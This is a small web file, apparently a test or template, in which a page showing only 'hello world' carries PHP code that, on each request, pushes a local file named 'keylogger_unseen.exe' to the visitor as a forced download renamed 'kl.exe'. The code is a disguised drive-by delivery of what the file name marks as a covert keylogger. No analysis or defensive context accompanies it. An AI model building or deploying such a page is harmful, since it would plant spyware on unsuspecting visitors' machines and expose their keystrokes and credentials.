<html>
<head>
</head>
<body>
hello world
</body>
</html>
<?php
$dir = 'keylogger_unseen.exe';
echo " hello world 2";
if (file_exists($dir)) {
	ob_clean();
	ob_end_flush();
    header("Content-type: application/exe"); 
	header("Content-Disposition: attachment; filename=/kl.exe");
	header("Content-length: " . filesize($dir));
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: no-cache');
    readfile($dir);

    exit;
}
?>